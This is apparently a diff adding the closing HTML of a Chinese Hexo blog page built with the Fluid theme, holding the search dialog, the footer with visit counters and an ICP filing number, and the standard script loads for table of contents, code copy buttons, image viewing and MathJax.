+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
